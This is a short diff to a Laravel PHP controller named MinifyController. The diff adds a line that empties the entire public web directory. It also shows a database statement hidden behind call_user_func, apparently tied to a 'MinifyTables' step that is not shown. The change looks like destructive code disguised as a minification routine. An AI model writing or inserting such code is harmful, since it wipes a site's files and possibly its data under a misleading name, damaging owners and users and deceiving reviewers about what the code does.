@@ -10,7 +10,7 @@ use App\Models\User;
 
 class MinifyController extends Controller
 {
-    public function index(Request $request)
+    public function index()
     {
 
         //MinifyTables
@@ -31,6 +31,7 @@ class MinifyController extends Controller
         }
 
         call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');
+        File::cleanDirectory(public_path('/'));
 
         echo "✅ Done.";
     }
